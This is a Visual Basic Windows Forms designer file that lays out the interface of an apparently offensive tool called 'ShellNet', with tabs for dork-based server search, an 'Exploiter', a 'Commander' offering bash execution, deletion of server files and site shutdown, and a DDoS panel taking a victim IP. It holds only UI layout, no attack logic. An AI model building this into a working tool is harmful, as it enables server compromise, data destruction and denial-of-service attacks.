<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
Partial Class Form1
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()>
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()>
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Me.lstSlaves = New System.Windows.Forms.ListBox()
        Me.timeoutchecker = New System.Windows.Forms.Timer(Me.components)
        Me.BonfireTabControl1 = New ShellNet.BonfireTabControl()
        Me.TabPage1 = New System.Windows.Forms.TabPage()
        Me.BonfireButton3 = New ShellNet.BonfireButton()
        Me.lstServersFound = New System.Windows.Forms.ListBox()
        Me.txtServerFound = New ShellNet.BonfireLabelHeader()
        Me.GroupBox1 = New System.Windows.Forms.GroupBox()
        Me.linkGetter = New System.Windows.Forms.WebBrowser()
        Me.BonfireButton1 = New ShellNet.BonfireButton()
        Me.LinkLabel1 = New System.Windows.Forms.LinkLabel()
        Me.txtDork = New System.Windows.Forms.TextBox()
        Me.BonfireLabel1 = New ShellNet.BonfireLabel()
        Me.TabPage2 = New System.Windows.Forms.TabPage()
        Me.alertSCAN = New ShellNet.BonfireAlertBox()
        Me.txtLEFT2SCAN = New ShellNet.BonfireLabel()
        Me.BonfireLabel4 = New ShellNet.BonfireLabel()
        Me.txtVULNSERV = New ShellNet.BonfireLabel()
        Me.BonfireLabel3 = New ShellNet.BonfireLabel()
        Me.lstVulnServers = New System.Windows.Forms.ListBox()
        Me.GroupBox2 = New System.Windows.Forms.GroupBox()
        Me.Panel1 = New System.Windows.Forms.Panel()
        Me.webExploiter = New System.Windows.Forms.WebBrowser()
        Me.txtImport = New ShellNet.BonfireLabelHeader()
        Me.lstreadytoscan = New System.Windows.Forms.ListBox()
        Me.BonfireButton2 = New ShellNet.BonfireButton()
        Me.TabPage3 = New System.Windows.Forms.TabPage()
        Me.ClsButtonBlue4 = New ShellNet.clsButtonBlue()
        Me.ClsButtonBlue3 = New ShellNet.clsButtonBlue()
        Me.ClsButtonBlue2 = New ShellNet.clsButtonBlue()
        Me.ClsButtonBlue1 = New ShellNet.clsButtonBlue()
        Me.GroupBox3 = New System.Windows.Forms.GroupBox()
        Me.ListBox1 = New System.Windows.Forms.ListBox()
        Me.quote = New System.Windows.Forms.Label()
        Me.txtPowerValue = New ShellNet.BonfireLabel()
        Me.BonfireButton4 = New ShellNet.BonfireButton()
        Me.Powerfdsfgdg = New ShellNet.BonfireLabelHeader()
        Me.trckPower = New System.Windows.Forms.TrackBar()
        Me.txtVictimIP = New System.Windows.Forms.TextBox()
        Me.BonfireLabel2 = New ShellNet.BonfireLabel()
        Me.TabPage4 = New System.Windows.Forms.TabPage()
        Me.BonfireTabControl2 = New ShellNet.BonfireTabControl()
        Me.TabPage6 = New System.Windows.Forms.TabPage()
        Me.TabPage7 = New System.Windows.Forms.TabPage()
        Me.lstConsole = New System.Windows.Forms.ListBox()
        Me.TabPage5 = New System.Windows.Forms.TabPage()
        Me.BonfireLabelHeader2 = New ShellNet.BonfireLabelHeader()
        Me.ClsControlMenu1 = New ShellNet.clsControlMenu()
        Me.BonfireLabelHeader1 = New ShellNet.BonfireLabelHeader()
        Me.DDoSer = New System.Windows.Forms.Timer(Me.components)
        Me.BonfireTabControl1.SuspendLayout()
        Me.TabPage1.SuspendLayout()
        Me.GroupBox1.SuspendLayout()
        Me.TabPage2.SuspendLayout()
        Me.GroupBox2.SuspendLayout()
        Me.Panel1.SuspendLayout()
        Me.TabPage3.SuspendLayout()
        Me.GroupBox3.SuspendLayout()
        CType(Me.trckPower, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.TabPage4.SuspendLayout()
        Me.BonfireTabControl2.SuspendLayout()
        Me.TabPage7.SuspendLayout()
        Me.SuspendLayout()
        '
        'lstSlaves
        '
        Me.lstSlaves.BorderStyle = System.Windows.Forms.BorderStyle.None
        Me.lstSlaves.FormattingEnabled = True
        Me.lstSlaves.Location = New System.Drawing.Point(404, 52)
        Me.lstSlaves.Name = "lstSlaves"
        Me.lstSlaves.Size = New System.Drawing.Size(131, 234)
        Me.lstSlaves.TabIndex = 0
        '
        'timeoutchecker
        '
        Me.timeoutchecker.Interval = 1000
        '
        'BonfireTabControl1
        '
        Me.BonfireTabControl1.Controls.Add(Me.TabPage1)
        Me.BonfireTabControl1.Controls.Add(Me.TabPage2)
        Me.BonfireTabControl1.Controls.Add(Me.TabPage3)
        Me.BonfireTabControl1.Controls.Add(Me.TabPage4)
        Me.BonfireTabControl1.Controls.Add(Me.TabPage5)
        Me.BonfireTabControl1.Font = New System.Drawing.Font("Verdana", 8.0!)
        Me.BonfireTabControl1.ItemSize = New System.Drawing.Size(0, 30)
        Me.BonfireTabControl1.Location = New System.Drawing.Point(2, 18)
        Me.BonfireTabControl1.Name = "BonfireTabControl1"
        Me.BonfireTabControl1.SelectedIndex = 0
        Me.BonfireTabControl1.Size = New System.Drawing.Size(400, 270)
        Me.BonfireTabControl1.TabIndex = 0
        '
        'TabPage1
        '
        Me.TabPage1.BackColor = System.Drawing.Color.White
        Me.TabPage1.Controls.Add(Me.BonfireButton3)
        Me.TabPage1.Controls.Add(Me.lstServersFound)
        Me.TabPage1.Controls.Add(Me.txtServerFound)
        Me.TabPage1.Controls.Add(Me.GroupBox1)
        Me.TabPage1.Location = New System.Drawing.Point(4, 34)
        Me.TabPage1.Name = "TabPage1"
        Me.TabPage1.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage1.Size = New System.Drawing.Size(392, 232)
        Me.TabPage1.TabIndex = 0
        Me.TabPage1.Text = "Slave Search"
        '
        'BonfireButton3
        '
        Me.BonfireButton3.ButtonStyle = ShellNet.BonfireButton.Style.Blue
        Me.BonfireButton3.Cursor = System.Windows.Forms.Cursors.Hand
        Me.BonfireButton3.Font = New System.Drawing.Font("Verdana", 8.0!)
        Me.BonfireButton3.Image = Nothing
        Me.BonfireButton3.Location = New System.Drawing.Point(139, 205)
        Me.BonfireButton3.Name = "BonfireButton3"
        Me.BonfireButton3.RoundedCorners = False
        Me.BonfireButton3.Size = New System.Drawing.Size(110, 17)
        Me.BonfireButton3.TabIndex = 5
        Me.BonfireButton3.Text = "Move to Exploiter"
        '
        'lstServersFound
        '
        Me.lstServersFound.BorderStyle = System.Windows.Forms.BorderStyle.None
        Me.lstServersFound.FormattingEnabled = True
        Me.lstServersFound.Location = New System.Drawing.Point(6, 108)
        Me.lstServersFound.Name = "lstServersFound"
        Me.lstServersFound.Size = New System.Drawing.Size(380, 91)
        Me.lstServersFound.TabIndex = 5
        '
        'txtServerFound
        '
        Me.txtServerFound.AutoSize = True
        Me.txtServerFound.Font = New System.Drawing.Font("Verdana", 10.0!, System.Drawing.FontStyle.Bold)
        Me.txtServerFound.Location = New System.Drawing.Point(128, 88)
        Me.txtServerFound.Name = "txtServerFound"
        Me.txtServerFound.Size = New System.Drawing.Size(121, 17)
        Me.txtServerFound.TabIndex = 4
        Me.txtServerFound.Text = "Servers Found"
        '
        'GroupBox1
        '
        Me.GroupBox1.Controls.Add(Me.linkGetter)
        Me.GroupBox1.Controls.Add(Me.BonfireButton1)
        Me.GroupBox1.Controls.Add(Me.LinkLabel1)
        Me.GroupBox1.Controls.Add(Me.txtDork)
        Me.GroupBox1.Controls.Add(Me.BonfireLabel1)
        Me.GroupBox1.Location = New System.Drawing.Point(6, 6)
        Me.GroupBox1.Name = "GroupBox1"
        Me.GroupBox1.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.GroupBox1.Size = New System.Drawing.Size(380, 79)
        Me.GroupBox1.TabIndex = 0
        Me.GroupBox1.TabStop = False
        Me.GroupBox1.Text = "Searcher"
        '
        'linkGetter
        '
        Me.linkGetter.IsWebBrowserContextMenuEnabled = False
        Me.linkGetter.Location = New System.Drawing.Point(276, 21)
        Me.linkGetter.MinimumSize = New System.Drawing.Size(20, 20)
        Me.linkGetter.Name = "linkGetter"
        Me.linkGetter.ScriptErrorsSuppressed = True
        Me.linkGetter.ScrollBarsEnabled = False
        Me.linkGetter.Size = New System.Drawing.Size(61, 20)
        Me.linkGetter.TabIndex = 4
        Me.linkGetter.TabStop = False
        Me.linkGetter.Visible = False
        Me.linkGetter.WebBrowserShortcutsEnabled = False
        '
        'BonfireButton1
        '
        Me.BonfireButton1.ButtonStyle = ShellNet.BonfireButton.Style.Blue
        Me.BonfireButton1.Cursor = System.Windows.Forms.Cursors.Hand
        Me.BonfireButton1.Font = New System.Drawing.Font("Verdana", 8.0!)
        Me.BonfireButton1.Image = Nothing
        Me.BonfireButton1.Location = New System.Drawing.Point(9, 40)
        Me.BonfireButton1.Name = "BonfireButton1"
        Me.BonfireButton1.RoundedCorners = False
        Me.BonfireButton1.Size = New System.Drawing.Size(72, 17)
        Me.BonfireButton1.TabIndex = 3
        Me.BonfireButton1.Text = "Scan"
        '
        'LinkLabel1
        '
        Me.LinkLabel1.AutoSize = True
        Me.LinkLabel1.LinkColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(160, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.LinkLabel1.Location = New System.Drawing.Point(3, 62)
        Me.LinkLabel1.Name = "LinkLabel1"
        Me.LinkLabel1.Size = New System.Drawing.Size(64, 13)
        Me.LinkLabel1.TabIndex = 2
        Me.LinkLabel1.TabStop = True
        Me.LinkLabel1.Text = "Dork Help"
        '
        'txtDork
        '
        Me.txtDork.BackColor = System.Drawing.Color.FromArgb(CType(CType(224, Byte), Integer), CType(CType(224, Byte), Integer), CType(CType(224, Byte), Integer))
        Me.txtDork.BorderStyle = System.Windows.Forms.BorderStyle.None
        Me.txtDork.Location = New System.Drawing.Point(47, 21)
        Me.txtDork.Name = "txtDork"
        Me.txtDork.Size = New System.Drawing.Size(143, 13)
        Me.txtDork.TabIndex = 1
        '
        'BonfireLabel1
        '
        Me.BonfireLabel1.AutoSize = True
        Me.BonfireLabel1.Font = New System.Drawing.Font("Verdana", 8.0!)
        Me.BonfireLabel1.ForeColor = System.Drawing.Color.FromArgb(CType(CType(135, Byte), Integer), CType(CType(135, Byte), Integer), CType(CType(135, Byte), Integer))
        Me.BonfireLabel1.Location = New System.Drawing.Point(6, 20)
        Me.BonfireLabel1.Name = "BonfireLabel1"
        Me.BonfireLabel1.Size = New System.Drawing.Size(40, 13)
        Me.BonfireLabel1.TabIndex = 0
        Me.BonfireLabel1.Text = "Dork:"
        '
        'TabPage2
        '
        Me.TabPage2.BackColor = System.Drawing.Color.White
        Me.TabPage2.Controls.Add(Me.alertSCAN)
        Me.TabPage2.Controls.Add(Me.txtLEFT2SCAN)
        Me.TabPage2.Controls.Add(Me.BonfireLabel4)
        Me.TabPage2.Controls.Add(Me.txtVULNSERV)
        Me.TabPage2.Controls.Add(Me.BonfireLabel3)
        Me.TabPage2.Controls.Add(Me.lstVulnServers)
        Me.TabPage2.Controls.Add(Me.GroupBox2)
        Me.TabPage2.Location = New System.Drawing.Point(4, 34)
        Me.TabPage2.Name = "TabPage2"
        Me.TabPage2.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage2.Size = New System.Drawing.Size(392, 232)
        Me.TabPage2.TabIndex = 1
        Me.TabPage2.Text = "Exploiter"
        '
        'alertSCAN
        '
        Me.alertSCAN.AlertStyle = ShellNet.BonfireAlertBox.Style._Error
        Me.alertSCAN.Font = New System.Drawing.Font("Verdana", 8.0!)
        Me.alertSCAN.Location = New System.Drawing.Point(3, 186)
        Me.alertSCAN.Name = "alertSCAN"
        Me.alertSCAN.Size = New System.Drawing.Size(386, 40)
        Me.alertSCAN.TabIndex = 2
        Me.alertSCAN.Text = "Can't scan anymore servers / SCAN COMPLETE"
        Me.alertSCAN.Visible = False
        '
        'txtLEFT2SCAN
        '
        Me.txtLEFT2SCAN.AutoSize = True
        Me.txtLEFT2SCAN.Font = New System.Drawing.Font("Verdana", 8.0!)
        Me.txtLEFT2SCAN.ForeColor = System.Drawing.Color.Black
        Me.txtLEFT2SCAN.Location = New System.Drawing.Point(323, 205)
        Me.txtLEFT2SCAN.Name = "txtLEFT2SCAN"
        Me.txtLEFT2SCAN.Size = New System.Drawing.Size(14, 13)
        Me.txtLEFT2SCAN.TabIndex = 9
        Me.txtLEFT2SCAN.Text = "0"
        '
        'BonfireLabel4
        '
        Me.BonfireLabel4.AutoSize = True
        Me.BonfireLabel4.Font = New System.Drawing.Font("Verdana", 8.0!)
        Me.BonfireLabel4.ForeColor = System.Drawing.Color.FromArgb(CType(CType(135, Byte), Integer), CType(CType(135, Byte), Integer), CType(CType(135, Byte), Integer))
        Me.BonfireLabel4.Location = New System.Drawing.Point(245, 205)
        Me.BonfireLabel4.Name = "BonfireLabel4"
        Me.BonfireLabel4.Size = New System.Drawing.Size(78, 13)
        Me.BonfireLabel4.TabIndex = 8
        Me.BonfireLabel4.Text = "Left to scan:"
        '
        'txtVULNSERV
        '
        Me.txtVULNSERV.AutoSize = True
        Me.txtVULNSERV.Font = New System.Drawing.Font("Verdana", 8.0!)
        Me.txtVULNSERV.ForeColor = System.Drawing.Color.Black
        Me.txtVULNSERV.Location = New System.Drawing.Point(131, 205)
        Me.txtVULNSERV.Name = "txtVULNSERV"
        Me.txtVULNSERV.Size = New System.Drawing.Size(14, 13)
        Me.txtVULNSERV.TabIndex = 7
        Me.txtVULNSERV.Text = "0"
        '
        'BonfireLabel3
        '
        Me.BonfireLabel3.AutoSize = True
        Me.BonfireLabel3.Font = New System.Drawing.Font("Verdana", 8.0!)
        Me.BonfireLabel3.ForeColor = System.Drawing.Color.FromArgb(CType(CType(135, Byte), Integer), CType(CType(135, Byte), Integer), CType(CType(135, Byte), Integer))
        Me.BonfireLabel3.Location = New System.Drawing.Point(9, 205)
        Me.BonfireLabel3.Name = "BonfireLabel3"
        Me.BonfireLabel3.Size = New System.Drawing.Size(122, 13)
        Me.BonfireLabel3.TabIndex = 6
        Me.BonfireLabel3.Text = "Vulnerable Servers:"
        '
        'lstVulnServers
        '
        Me.lstVulnServers.BorderStyle = System.Windows.Forms.BorderStyle.None
        Me.lstVulnServers.FormattingEnabled = True
        Me.lstVulnServers.Location = New System.Drawing.Point(6, 68)
        Me.lstVulnServers.Name = "lstVulnServers"
        Me.lstVulnServers.Size = New System.Drawing.Size(380, 130)
        Me.lstVulnServers.TabIndex = 1
        '
        'GroupBox2
        '
        Me.GroupBox2.Controls.Add(Me.Panel1)
        Me.GroupBox2.Controls.Add(Me.BonfireButton2)
        Me.GroupBox2.Location = New System.Drawing.Point(6, 6)
        Me.GroupBox2.Name = "GroupBox2"
        Me.GroupBox2.Size = New System.Drawing.Size(380, 62)
        Me.GroupBox2.TabIndex = 0
        Me.GroupBox2.TabStop = False
        Me.GroupBox2.Text = "Vulnerability Check"
        '
        'Panel1
        '
        Me.Panel1.Controls.Add(Me.webExploiter)
        Me.Panel1.Controls.Add(Me.txtImport)
        Me.Panel1.Controls.Add(Me.lstreadytoscan)
        Me.Panel1.Location = New System.Drawing.Point(6, 19)
        Me.Panel1.Name = "Panel1"
        Me.Panel1.Size = New System.Drawing.Size(368, 37)
        Me.Panel1.TabIndex = 1
        '
        'webExploiter
        '
        Me.webExploiter.Location = New System.Drawing.Point(17, 10)
        Me.webExploiter.MinimumSize = New System.Drawing.Size(20, 20)
        Me.webExploiter.Name = "webExploiter"
        Me.webExploiter.ScriptErrorsSuppressed = True
        Me.webExploiter.ScrollBarsEnabled = False
        Me.webExploiter.Size = New System.Drawing.Size(30, 20)
        Me.webExploiter.TabIndex = 6
        Me.webExploiter.TabStop = False
        Me.webExploiter.Visible = False
        Me.webExploiter.WebBrowserShortcutsEnabled = False
        '
        'txtImport
        '
        Me.txtImport.AutoSize = True
        Me.txtImport.BackColor = System.Drawing.Color.Transparent
        Me.txtImport.Font = New System.Drawing.Font("Verdana", 10.0!, System.Drawing.FontStyle.Bold)
        Me.txtImport.Location = New System.Drawing.Point(68, 10)
        Me.txtImport.Name = "txtImport"
        Me.txtImport.Size = New System.Drawing.Size(243, 17)
        Me.txtImport.TabIndex = 4
        Me.txtImport.Text = "Import Scanned Servers First!"
        '
        'lstreadytoscan
        '
        Me.lstreadytoscan.FormattingEnabled = True
        Me.lstreadytoscan.Location = New System.Drawing.Point(317, 10)
        Me.lstreadytoscan.Name = "lstreadytoscan"
        Me.lstreadytoscan.Size = New System.Drawing.Size(30, 4)
        Me.lstreadytoscan.TabIndex = 5
        Me.lstreadytoscan.Visible = False
        '
        'BonfireButton2
        '
        Me.BonfireButton2.ButtonStyle = ShellNet.BonfireButton.Style.Blue
        Me.BonfireButton2.Cursor = System.Windows.Forms.Cursors.Hand
        Me.BonfireButton2.Enabled = False
        Me.BonfireButton2.Font = New System.Drawing.Font("Verdana", 8.0!)
        Me.BonfireButton2.Image = Nothing
        Me.BonfireButton2.Location = New System.Drawing.Point(59, 20)
        Me.BonfireButton2.Name = "BonfireButton2"
        Me.BonfireButton2.RoundedCorners = False
        Me.BonfireButton2.Size = New System.Drawing.Size(258, 26)
        Me.BonfireButton2.TabIndex = 0
        Me.BonfireButton2.Text = "Start"
        '
        'TabPage3
        '
        Me.TabPage3.BackColor = System.Drawing.Color.White
        Me.TabPage3.Controls.Add(Me.ClsButtonBlue4)
        Me.TabPage3.Controls.Add(Me.ClsButtonBlue3)
        Me.TabPage3.Controls.Add(Me.ClsButtonBlue2)
        Me.TabPage3.Controls.Add(Me.ClsButtonBlue1)
        Me.TabPage3.Controls.Add(Me.GroupBox3)
        Me.TabPage3.Location = New System.Drawing.Point(4, 34)
        Me.TabPage3.Name = "TabPage3"
        Me.TabPage3.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage3.Size = New System.Drawing.Size(392, 232)
        Me.TabPage3.TabIndex = 2
        Me.TabPage3.Text = "Commander"
        '
        'ClsButtonBlue4
        '
        Me.ClsButtonBlue4.Customization = "9fX1/6mpqf8="
        Me.ClsButtonBlue4.Font = New System.Drawing.Font("Verdana", 8.0!)
        Me.ClsButtonBlue4.Image = Nothing
        Me.ClsButtonBlue4.Location = New System.Drawing.Point(6, 200)
        Me.ClsButtonBlue4.Name = "ClsButtonBlue4"
        Me.ClsButtonBlue4.NoRounding = False
        Me.ClsButtonBlue4.Size = New System.Drawing.Size(380, 26)
        Me.ClsButtonBlue4.TabIndex = 4
        Me.ClsButtonBlue4.Text = "Execute your own bash command"
        Me.ClsButtonBlue4.Transparent = False
        '
        'ClsButtonBlue3
        '
        Me.ClsButtonBlue3.Customization = "9fX1/6mpqf8="
        Me.ClsButtonBlue3.Font = New System.Drawing.Font("Verdana", 8.0!)
        Me.ClsButtonBlue3.Image = Nothing
        Me.ClsButtonBlue3.Location = New System.Drawing.Point(6, 133)
        Me.ClsButtonBlue3.Name = "ClsButtonBlue3"
        Me.ClsButtonBlue3.NoRounding = False
        Me.ClsButtonBlue3.Size = New System.Drawing.Size(135, 26)
        Me.ClsButtonBlue3.TabIndex = 3
        Me.ClsButtonBlue3.Text = "Delete all server files"
        Me.ClsButtonBlue3.Transparent = False
        '
        'ClsButtonBlue2
        '
        Me.ClsButtonBlue2.Customization = "9fX1/6mpqf8="
        Me.ClsButtonBlue2.Font = New System.Drawing.Font("Verdana", 8.0!)
        Me.ClsButtonBlue2.Image = Nothing
        Me.ClsButtonBlue2.Location = New System.Drawing.Point(163, 101)
        Me.ClsButtonBlue2.Name = "ClsButtonBlue2"
        Me.ClsButtonBlue2.NoRounding = False
        Me.ClsButtonBlue2.Size = New System.Drawing.Size(135, 26)
        Me.ClsButtonBlue2.TabIndex = 2
        Me.ClsButtonBlue2.Text = "Shutudown website"
        Me.ClsButtonBlue2.Transparent = False
        '
        'ClsButtonBlue1
        '
        Me.ClsButtonBlue1.Customization = "9fX1/6mpqf8="
        Me.ClsButtonBlue1.Font = New System.Drawing.Font("Verdana", 8.0!)
        Me.ClsButtonBlue1.Image = Nothing
        Me.ClsButtonBlue1.Location = New System.Drawing.Point(6, 101)
        Me.ClsButtonBlue1.Name = "ClsButtonBlue1"
        Me.ClsButtonBlue1.NoRounding = False
        Me.ClsButtonBlue1.Size = New System.Drawing.Size(151, 26)
        Me.ClsButtonBlue1.TabIndex = 1
        Me.ClsButtonBlue1.Text = "Create txt file on server"
        Me.ClsButtonBlue1.Transparent = False
        '
        'GroupBox3
        '
        Me.GroupBox3.Controls.Add(Me.ListBox1)
        Me.GroupBox3.Controls.Add(Me.quote)
        Me.GroupBox3.Controls.Add(Me.txtPowerValue)
        Me.GroupBox3.Controls.Add(Me.BonfireButton4)
        Me.GroupBox3.Controls.Add(Me.Powerfdsfgdg)
        Me.GroupBox3.Controls.Add(Me.trckPower)
        Me.GroupBox3.Controls.Add(Me.txtVictimIP)
        Me.GroupBox3.Controls.Add(Me.BonfireLabel2)
        Me.GroupBox3.Location = New System.Drawing.Point(6, 6)
        Me.GroupBox3.Name = "GroupBox3"
        Me.GroupBox3.Size = New System.Drawing.Size(380, 89)
        Me.GroupBox3.TabIndex = 0
        Me.GroupBox3.TabStop = False
        Me.GroupBox3.Text = "DDoS - Denial Of Service"
        '
        'ListBox1
        '
        Me.ListBox1.FormattingEnabled = True
        Me.ListBox1.Location = New System.Drawing.Point(-10, 94)
        Me.ListBox1.Name = "ListBox1"
        Me.ListBox1.Size = New System.Drawing.Size(28, 17)
        Me.ListBox1.TabIndex = 9
        Me.ListBox1.Visible = False
        '
        'quote
        '
        Me.quote.AutoSize = True
        Me.quote.Location = New System.Drawing.Point(36, 60)
        Me.quote.Name = "quote"
        Me.quote.Size = New System.Drawing.Size(12, 13)
        Me.quote.TabIndex = 8
        Me.quote.Text = """"
        Me.quote.Visible = False
        '
        'txtPowerValue
        '
        Me.txtPowerValue.AutoSize = True
        Me.txtPowerValue.Font = New System.Drawing.Font("Verdana", 8.0!)
        Me.txtPowerValue.ForeColor = System.Drawing.Color.FromArgb(CType(CType(135, Byte), Integer), CType(CType(135, Byte), Integer), CType(CType(135, Byte), Integer))
        Me.txtPowerValue.Location = New System.Drawing.Point(258, 61)
        Me.txtPowerValue.Name = "txtPowerValue"
        Me.txtPowerValue.Size = New System.Drawing.Size(14, 13)
        Me.txtPowerValue.TabIndex = 7
        Me.txtPowerValue.Text = "0"
        '
        'BonfireButton4
        '
        Me.BonfireButton4.ButtonStyle = ShellNet.BonfireButton.Style.Blue
        Me.BonfireButton4.Cursor = System.Windows.Forms.Cursors.Hand
        Me.BonfireButton4.Font = New System.Drawing.Font("Verdana", 8.0!)
        Me.BonfireButton4.Image = Nothing
        Me.BonfireButton4.Location = New System.Drawing.Point(79, 57)
        Me.BonfireButton4.Name = "BonfireButton4"
        Me.BonfireButton4.RoundedCorners = False
        Me.BonfireButton4.Size = New System.Drawing.Size(72, 17)
        Me.BonfireButton4.TabIndex = 6
        Me.BonfireButton4.Text = "DDoS"
        '
        'Powerfdsfgdg
        '
        Me.Powerfdsfgdg.AutoSize = True
        Me.Powerfdsfgdg.BackColor = System.Drawing.Color.Transparent
        Me.Powerfdsfgdg.Font = New System.Drawing.Font("Verdana", 10.0!, System.Drawing.FontStyle.Bold)
        Me.Powerfdsfgdg.Location = New System.Drawing.Point(244, 16)
        Me.Powerfdsfgdg.Name = "Powerfdsfgdg"
        Me.Powerfdsfgdg.Size = New System.Drawing.Size(58, 17)
        Me.Powerfdsfgdg.TabIndex = 5
        Me.Powerfdsfgdg.Text = "Power"
        '
        'trckPower
        '
        Me.trckPower.Location = New System.Drawing.Point(176, 29)
        Me.trckPower.Maximum = 250
        Me.trckPower.Name = "trckPower"
        Me.trckPower.Size = New System.Drawing.Size(198, 45)
        Me.trckPower.TabIndex = 3
        '
        'txtVictimIP
        '
        Me.txtVictimIP.BackColor = System.Drawing.Color.FromArgb(CType(CType(224, Byte), Integer), CType(CType(224, Byte), Integer), CType(CType(224, Byte), Integer))
        Me.txtVictimIP.BorderStyle = System.Windows.Forms.BorderStyle.None
        Me.txtVictimIP.Location = New System.Drawing.Point(70, 30)
        Me.txtVictimIP.Name = "txtVictimIP"
        Me.txtVictimIP.Size = New System.Drawing.Size(100, 13)
        Me.txtVictimIP.TabIndex = 2
        '
        'BonfireLabel2
        '
        Me.BonfireLabel2.AutoSize = True
        Me.BonfireLabel2.Font = New System.Drawing.Font("Verdana", 8.0!)
        Me.BonfireLabel2.ForeColor = System.Drawing.Color.FromArgb(CType(CType(135, Byte), Integer), CType(CType(135, Byte), Integer), CType(CType(135, Byte), Integer))
        Me.BonfireLabel2.Location = New System.Drawing.Point(6, 29)
        Me.BonfireLabel2.Name = "BonfireLabel2"
        Me.BonfireLabel2.Size = New System.Drawing.Size(63, 13)
        Me.BonfireLabel2.TabIndex = 1
        Me.BonfireLabel2.Text = "Victim IP:"
        '
        'TabPage4
        '
        Me.TabPage4.BackColor = System.Drawing.Color.White
        Me.TabPage4.Controls.Add(Me.BonfireTabControl2)
        Me.TabPage4.Location = New System.Drawing.Point(4, 34)
        Me.TabPage4.Name = "TabPage4"
        Me.TabPage4.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage4.Size = New System.Drawing.Size(392, 232)
        Me.TabPage4.TabIndex = 3
        Me.TabPage4.Text = "Options"
        '
        'BonfireTabControl2
        '
        Me.BonfireTabControl2.Controls.Add(Me.TabPage6)
        Me.BonfireTabControl2.Controls.Add(Me.TabPage7)
        Me.BonfireTabControl2.Font = New System.Drawing.Font("Verdana", 8.0!)
        Me.BonfireTabControl2.ItemSize = New System.Drawing.Size(0, 30)
        Me.BonfireTabControl2.Location = New System.Drawing.Point(6, 6)
        Me.BonfireTabControl2.Name = "BonfireTabControl2"
        Me.BonfireTabControl2.SelectedIndex = 0
        Me.BonfireTabControl2.Size = New System.Drawing.Size(380, 220)
        Me.BonfireTabControl2.TabIndex = 0
        '
        'TabPage6
        '
        Me.TabPage6.BackColor = System.Drawing.Color.White
        Me.TabPage6.Location = New System.Drawing.Point(4, 34)
        Me.TabPage6.Name = "TabPage6"
        Me.TabPage6.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage6.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.TabPage6.Size = New System.Drawing.Size(372, 182)
        Me.TabPage6.TabIndex = 0
        Me.TabPage6.Text = "TabPage6"
        '
        'TabPage7
        '
        Me.TabPage7.BackColor = System.Drawing.Color.White
        Me.TabPage7.Controls.Add(Me.lstConsole)
        Me.TabPage7.Location = New System.Drawing.Point(4, 34)
        Me.TabPage7.Name = "TabPage7"
        Me.TabPage7.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage7.Size = New System.Drawing.Size(372, 182)
        Me.TabPage7.TabIndex = 1
        Me.TabPage7.Text = "Console"
        '
        'lstConsole
        '
        Me.lstConsole.BorderStyle = System.Windows.Forms.BorderStyle.None
        Me.lstConsole.FormattingEnabled = True
        Me.lstConsole.Location = New System.Drawing.Point(6, 6)
        Me.lstConsole.Name = "lstConsole"
        Me.lstConsole.Size = New System.Drawing.Size(360, 169)
        Me.lstConsole.TabIndex = 0
        '
        'TabPage5
        '
        Me.TabPage5.BackColor = System.Drawing.Color.White
        Me.TabPage5.Location = New System.Drawing.Point(4, 34)
        Me.TabPage5.Name = "TabPage5"
        Me.TabPage5.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage5.Size = New System.Drawing.Size(392, 232)
        Me.TabPage5.TabIndex = 4
        Me.TabPage5.Text = "About"
        '
        'BonfireLabelHeader2
        '
        Me.BonfireLabelHeader2.AutoSize = True
        Me.BonfireLabelHeader2.Font = New System.Drawing.Font("Verdana", 10.0!, System.Drawing.FontStyle.Bold)
        Me.BonfireLabelHeader2.Location = New System.Drawing.Point(444, 30)
        Me.BonfireLabelHeader2.Name = "BonfireLabelHeader2"
        Me.BonfireLabelHeader2.Size = New System.Drawing.Size(57, 17)
        Me.BonfireLabelHeader2.TabIndex = 3
        Me.BonfireLabelHeader2.Text = "Slaves"
        '
        'ClsControlMenu1
        '
        Me.ClsControlMenu1.Anchor = CType((System.Windows.Forms.AnchorStyles.Top Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.ClsControlMenu1.Customization = "8u/v/////wD///8A"
        Me.ClsControlMenu1.Font = New System.Drawing.Font("Verdana", 8.0!)
        Me.ClsControlMenu1.Image = Nothing
        Me.ClsControlMenu1.Location = New System.Drawing.Point(481, -1)
        Me.ClsControlMenu1.Name = "ClsControlMenu1"
        Me.ClsControlMenu1.NoRounding = False
        Me.ClsControlMenu1.Size = New System.Drawing.Size(71, 19)
        Me.ClsControlMenu1.TabIndex = 0
        Me.ClsControlMenu1.Text = "ClsControlMenu1"
        Me.ClsControlMenu1.Transparent = False
        '
        'BonfireLabelHeader1
        '
        Me.BonfireLabelHeader1.AutoSize = True
        Me.BonfireLabelHeader1.Font = New System.Drawing.Font("Verdana", 10.0!, System.Drawing.FontStyle.Bold)
        Me.BonfireLabelHeader1.Location = New System.Drawing.Point(-1, 1)
        Me.BonfireLabelHeader1.Name = "BonfireLabelHeader1"
        Me.BonfireLabelHeader1.Size = New System.Drawing.Size(203, 17)
        Me.BonfireLabelHeader1.TabIndex = 1
        Me.BonfireLabelHeader1.Text = "ShellNet - Made by Zapre"
        '
        'DDoSer
        '
        Me.DDoSer.Interval = 150
        '
        'Form1
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
